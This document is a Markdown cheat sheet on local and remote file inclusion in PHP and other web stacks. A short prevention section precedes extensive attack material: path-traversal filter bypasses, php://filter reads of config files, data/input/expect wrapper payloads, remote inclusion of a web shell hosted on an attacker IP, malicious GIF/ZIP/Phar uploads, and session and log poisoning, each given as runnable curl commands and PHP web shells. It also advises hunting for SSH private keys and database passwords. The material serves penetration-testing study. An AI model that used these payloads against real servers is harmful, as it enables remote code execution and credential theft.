### Content

- [Overview](#overview)
	- [Inclusion functions](#inclusion-functions)
	- [Prevention](#prevention)
- [Bypasses Techniques](#bypasses-techniques)
	- [Non-Recursive Path Traversal Filters](#non-recursive-path-traversal-filters)
	- [Encoding](#encoding)
	- [Approved Paths](#approved-paths)
	- [Appended Extension](#appended-extension)
- [PHP Wrappers](#php-wrappers)
- [Abusing Wrappers](#abusing-wrappers)
	- [PHP Wrapper - LFD](#php-wrapper---lfd)
	- [Wrappers for RCE](#wrappers-for-rce)
		- [Data Wrapper](#data-wrapper)
		- [Input Wrapper](#input-wrapper)
		- [Expect Wrapper](#expect-wrapper)
- [RFI to RCE](#rfi-to-rce)
	- [HTTP Server](#http-server)
	- [FTP Server](#ftp-server)
	- [SMB Server](#smb-server)
- [LFI + File Uploads = RCE](#lfi-+-file-uploads-=-rce)
	- [GIF](#gif)
	- [ZIP](#zip)
	- [Phar](#phar)
- [Log Poisoning](#log-poisoning)
	- [PHP Session Poisoning](#php-session-poisoning)
	- [Server Log Poisoning](#server-log-poisoning)
- [Automation](#automation)

> [!Note]
> 
> - Common readable files: `/etc/passwd` - `C:\Windows\win.ini`
> - [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI), [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) Contains various bypasses.
> - [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) for common web root paths.
> - `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed).
> - `/etc/php/X.Y/fpm/php.ini` for Nginx.
> - Search for DB password in `config.php` and check for password reuse.
> - Check `.ssh` directory on each user home directory for their private keys `id_rsa`.

---
### Overview

LFI (Local File Inclusion): focuses on executing or including a local file, often resulting in remote code execution (RCE).
LFD (Local File Disclosure): focuses on reading or displaying the contents of a local file, acting as a "silent data leak".

- **Types of File Inclusion**:
    - **Local File Inclusion (LFI)**: An attacker includes files from the local file system by manipulating paths.
    - **Remote File Inclusion (RFI)**: An attacker includes files from an external server by supplying a remote URL.
- **Cause**: File inclusion vulnerabilities occur when an application dynamically loads files based on user input without properly validating or sanitizing the file paths. If user input is passed directly to a function that includes files (e.g., `include` in PHP), attackers can control which files are included.
- **Exploitation**:
    - **LFI**: Attackers can manipulate file paths (e.g., using `../../etc/passwd`) to access sensitive system files. If the application is vulnerable to LFI, attackers may also try to execute code by including files that they upload or injecting code into log files that can be loaded.
    - **RFI**: By supplying a URL as the file path, attackers can make the server download and execute files from an external source, allowing remote code execution. RFI is often restricted in modern environments, but it remains a risk if URL-based includes are allowed.
- **Impact**:
    - Sensitive Data Disclosure
    - Remote Code Execution (RCE)
    - Privilege Escalation

Second-Order Attacks: If a user can retrieve his avatar through `/profile/$username/avatar.png`, if a malicious user can craft a malicious name `../../../../../etc/passwd` and the web application didn't sanitize of validate that username, it'll be possible to pull another local file from the system.

##### Inclusion functions

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()` Express.js    |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

Examples, If the web application takes a `GET` parameter `?language=en` as input without sanitization or filtration :

`PHP`:

``` PHP
if (isset($_GET['language'])) { include($_GET['language']); }
```

`JS`:

``` JS
// NodeJS
if(req.query.language) {
	fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
		res.write(data);
	});
}
// Express.js
app.get("/about/:language", function(req, res) {
	res.render(`/${req.params.language}/about.html`);
});
```

`Java`, `Java Server Pages (JSP)`:

``` java
// Include local files based on the specified parameter
<c:if test="${not empty param.language}">
	<jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

// The (import) function may also be used to render a local file or a URL
<c:import url= "<%= request.getParameter('language') %>"/>
```

`.NET`:

``` CS
// Takes a file path for its input and writes its content to the response
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
	<% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> }
// Render the specified file as part of the front-end template
@Html.Partial(HttpContext.Request.Query['language'])
// Render local files or remote URLs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

##### Prevention

###### Avoid Including Files Based in User Input

If it's not feasible to to avoid passing any user-controlled inputs into any file inclusion functions or APIs, Utilize a limited whitelist of allowed user inputs, and match each input to the file to be loaded, while having a default value for all other inputs.

###### Preventing Directory Traversal

Use the programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has `basename()`, which will read the path and only return the filename portion.

We can also utilize manually created functions:

```PHP
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

###### Web Server Configuration

- Disable the inclusion of remote files. (PHP: set `allow_url_fopen` and `allow_url_include` to Off)
- lock web apps to their web root directory, preventing them from accessing non-web related files. can be done by:
	- Running the application within Docker.
	- Adding that option if the language supports it. (PHP: add `open_basedir = /var/www` in the `php.ini` file)
	- Ensuring potentially dangerous modules are disabled, like [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html).

###### Use Web Application Firewall (WAF)
---
### Bypasses Techniques
##### Non-Recursive Path Traversal Filters

- If the `../` substring is being replaced from user input.
- Try to use: `....//`  `..././` `....\/` `....////`

##### Encoding

- If the target didn't allow `.` and `/` characters as input.
- Try encoding and double encoding: `../etc/passwd` -> `%2E%2E%2F%65%74%63%2F%70%61%73%73%77%64` -> `%25%32%45%25%32%45%25%32%46%25%36%35%25%37%34%25%36%33%25%32%46%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34`

##### Approved Paths

If the web application uses regular expressions to ensure that the file being included is under a specific path.
Fuzz web directories under the same path until you get an approved path, then start trying payloads such as `../` to get back to root DIR.

##### Appended Extension

If the web applications append an extension to our input string (e.g. `.php`), it can't be bypassed on modern versions of PHP but can be useful to read the source code to review for the developer mistakes.
We can also look for one of the three coming techniques to bypass appended extension in older PHP versions:

- [Path Truncation](#path-truncation)
- [Null Bytes](#null-bytes)
- [Filename Prefix](#filename-prefix)

###### Path Truncation

Path truncation technique works with `PHP` versions before `5.3`/`5.4` as earlier versions of PHP has a limit of 4096 characters, If a longer string passed, it will be truncated:

- PHP disregard:
	- Trailing `/.` : `/etc/passwd/.` -> `/etc/passwd`
	- Multiple `/` : `////etc/passwd` -> `/etc/passwd`
	- Current directory shortcut `./` : `/etc/./passwd` -> `/etc/passwd`
- We have to start the path with a `non-existing directory` for this technique to work.

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

###### Null Bytes

- PHP versions before `5.5` were vulnerable to null byte injection, `%00` terminate strings.
- Sending `/etc/passwd%00` would be `/etc/passwd%00.php` but the path used would actually be `/etc/passwd`.

###### Filename Prefix

- If the web app takes an input `file` and appends `lang_` to it, resulting in `lang_../../../etc/passwd` which will be invalid path.
- Add `/` at the beginning of the path, `lang_/../../../etc/passwd`, the leading `/` might reset the path to root.

---
### PHP Wrappers

PHP comes with many built-in [wrappers](https://www.php.net/manual/en/wrappers.php.php) for various URL-style protocols for use with the filesystem functions, which allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams.

wrappers examples:

- [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
- [php://](https://www.php.net/manual/en/wrappers.php.php) — Accessing various I/O streams
- [phar://](https://www.php.net/manual/en/wrappers.phar.php) — PHP Archive
- [expect://](https://www.php.net/manual/en/wrappers.expect.php) — Process Interaction Streams

`php://` is a built-in PHP stream wrapper that provides access to various I/O streams. It's not a file path, it's an abstraction layer that lets PHP interact with input/output, memory, filters, and more. The most useful for us will be the  `filter` stream. 

[php://filter](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter) is a kind of meta-wrapper designed to permit the application of [filters](https://www.php.net/manual/en/filters.php) to a stream at the time of opening.

- [String Filters](https://www.php.net/manual/en/filters.string.php)
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php) (The most important filter for LFI)
- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)

Main parameters for `php://filter` filter stream wrapper are `resource` and `read`.

- `resource` To specify the stream we would like to apply our filter on (e.g. local file).
- `read` To apply different filters on the input resource such as `convert.base64-encode` conversion filter.

`php://filter/read=<Filter_Applied_on_Source>/source=<File_to_Read>`

---
### Abusing Wrappers

Suppose we have a vulnerable LFI endpoint `http://<SERVER_IP>:<PORT>/index.php?language=en`, where we can inject arbitrary file names in `language` value. (The app is using appended extension to the user input)

To abuse the wrappers, at first we need to identify which file we will target to read while exploiting LFI, and that can be done through discovering existing files on the web server, regardless of whether they are reachable with status code `200` or not, as long as we have working LFI, we can read those files.

That can be done using tools such ffuf:

``` bash
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
index                   [Status: 302, Size: 1343, Words: 1, Lines: 1, Duration: 69ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
```

#### PHP Wrapper - LFD

Now that we know there is a file called `configure`, using PHP wrapper with `filter` stream `convert` filter to encode the content of the file so it doesn't get executed then decode the output, we can retrieve its content.

``` bash
curl http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
# You can then decode the base64 you retrieved from the server
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

#### Wrappers for RCE

We can achieve RCE from LFI using [data](https://www.php.net/manual/en/wrappers.data.php), [input](https://www.php.net/manual/en/wrappers.php.php), [expect](https://www.php.net/manual/en/wrappers.expect.php) wrappers. But they are only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

Confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability:

``` bash
curl "http://URL/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Then decode the output
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep 
allow_url_include = On
```

##### Data Wrapper

Data wrapper can be used to include external data, including PHP code.

Encode our payload then send it with data wrapper `data://text/plain;base64,<PAYLOAD>&<VAR>=<COMMAND>`:

``` bash
$ echo '<?php system($_REQUEST["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
```

##### Input Wrapper

- Input wrapper used to include external input and execute PHP code.
- The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a **POST** request's data.
- The vulnerable parameter must accept POST requests for this attack to work.

Send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, pass it as a GET parameter, which will only work if the vulnerable function also accepts GET request (using `$_REQUEST[]`):

``` bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://URL/index.php?language=php://input&cmd=id"
```

If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell:

```bash
# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
```

##### Expect Wrapper

- Expect wrapper, which allows us to directly run commands through URL streams.
- Don't need to provide a web shell, as it is designed to execute commands.
- It's an external wrapper so it has to be installed and enabled manually.
- Check `extension=expect` in the PHP configuration file to make sure it's enabled.

``` bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---
### RFI to RCE

Any RFI vulnerability is also an LFI, but an LFI may not necessarily be an RFI. (Check [Inclusion functions](#inclusion-functions))

To Verify RFI vulnerability in PHP server:

- Reading the source code and checking the [Inclusion functions](#inclusion-functions) to make sure that the vulnerable function is allowing remote URLs.
- Check `allow_url_include` setting on `php.ini`.
- Include a local URL `http://127.0.0.1:80/index.php` to see firewall reaction.
	- Don't include the vulnerable page to avoid recursive inclusion loop (DOS).

Create and host a web shell:

```php
<?php system($_GET["cmd"]); ?>
```

###### HTTP Server

``` bash
# Start the HTTP Server
sudo python3 -m http.server <LISTENING_PORT>
# Visit the URL on the browser:
curl "http://<SERVER_IP>:<PORT>/index.php?language=http://<Attacker_IP>:<PORT>/shell.php&cmd=id"
```

###### FTP Server

``` bash
# Start FTP server on the attacker machine
sudo python -m pyftpdlib -p 21
# Using the FTP wrapper If the server uses anonymous creds:
curl "http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id"
# If the server requires creds:
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

###### SMB Server

``` bash
# If the vulnerable web application is hosted on a Windows server
impacket-smbserver -smb2support share $(pwd)
# Visist the URL on the browser:
curl "http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami"
```

---
### LFI + File Uploads = RCE

If an attacker can: 

1. Upload a file with malicious content.
2. Know where the uploaded file location.
3. Have working LFI vulnerability.

Then he can achieve RCE from LFI by accessing the malicious uploaded file.

#### GIF

```bash
# Creat the malicious GIF file
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# If the source code is exposing where did the file has been uploaded:
# <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">

# Having a working LFI in the website will help us to call the malicious file
curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
```

#### ZIP

Utilize the [zlib, bzip2 and zip](https://www.php.net/manual/en/wrappers.compression.php) wrappers to execute PHP code. (Not enabled by default)

```bash
# Craft the malicious ZIP and upload it.
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# Include the uploaded file in the LFI vulnerable function
curl "http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id"
```

#### Phar

Using `phar://` wrapper, PHAR archive (PHP Archive format) behaves like a compressed file but is also **interpretable** by PHP.

Create `shell.php` which will create a PHAR payload. 

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Execute `shell.php` and enable PHAR creation as it disabled by default (`phar.readonly=1`), which will create `shell.phar`:

```bash
$ php --define phar.readonly=0 shell.php
```

Disguise the payload and upload it then access it through the vulnerable function. (PHP detects PHAR by content, not extension)

```bash
$ mv shell.phar shell.jpg

$ curl "http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id"
```

> Also, look at this vulnerability: [(LFI + uploads enabled + old PHP + exposed phpinfo())](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)

---
### Log Poisoning

An attacker can achieve RCE from log poisoning if he:

- Has working LFI in the target website.
- Can write PHP code in a controlled field that gets logged into a log file and the web application has read privileges over that file.
- Know the logged file location.
- Can include the file to execute the PHP code.

Below two techniques to achieve this:

#### PHP Session Poisoning

PHP web apps utilize `PHPSESSID` cookies to save user data in `session` files on the back-end, and saved in:

- `/var/lib/php/sessions/sess_<PHPSESSID_cookie_value>`  on Linux
- `C:\Windows\Temp\sessions\sess_<PHPSESSID_cookie_value>` on Windows

By including the session file through the LFI vulnerability and view its contents, we can see that we can control the `?language` parameter `en.php` in the file: 

``` bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd"
[SNIP]......page|s:6:"en.php";preference|s:7:"English";.......
```

Manipulate the controllable parameter to become a PHP web shell:

``` bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
```

Include the session file and use the `&cmd=id` to execute a commands:

``` bash
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id"
......page|s:30:"uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)";preference|s:7:"Spanish";.....[SNIP]
```

> [!tip]
> To execute another command, the session file has to be poisoned with the web shell again, as the `?language=` parameter gets overwritten after every inclusion.
> 
> Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

#### Server Log Poisoning

Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log` which exist in:

- `Nginx` (readable by low privileged users by default) 
	- `/var/log/nginx/`
	- `C:\nginx\log\`
- `Apache` (readable by users with high privileges, **Older and misconfigured are not**)
	- `/var/log/apache2/`
	- `C:\xampp\apache\logs\`

> If they are in different location, we may use [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.

Poisoning `User-Agent` header on http requests, which will usually get stored on:

- `access.log`
- `/proc/self/environ`
- `/proc/self/fd/N` files (where N is a PID usually between 0-50)

``` bash
# Poisning the User-Agent header so it get logged with our PHP payload.
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"

# Include the poisnoned log file in the vulnerable endpoint parameter
curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log?cmd=id" | grep uid
[SNIP]..."uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)"
```

> [!tip]
> 
> If the web application has read permissions over various system services logs such `ssh`, `ftp` and `mail` services:
> 
> - try logging into them using PHP web shell as username or sending an email containing PHP web shell and upon including their logs, the PHP code would execute.
> - `/var/log/sshd.log` - `/var/log/vsftpd.log` - `/var/log/mail`

---
### Automation

Fuzz for pages.

```bash
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
index                   [Status: 302, Size: 1343, Words: 1, Lines: 1, Duration: 69ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
```

Fuzz for parameters (`GET`/`POST`) to identify exposed parameters that are not linked to any forms we tested manually.
Most popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).

``` bash
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

Fuzz the parameter values with LFI wordlists. (e.g. [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt))

``` bash
$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Fuzz for server Webroot directory. 

``` bash
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Fuzz for server logs and configurations. (wordlists: [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), [wordlist for Linux](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI/Linux), [wordlist for Windows](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI/Windows))

``` bash
$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
....[SNIP].....
```

Reading configurations

``` bash
$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
...SNIP...
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
...SNIP...
$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
...SNIP...
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
...SNIP...
```

The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).

---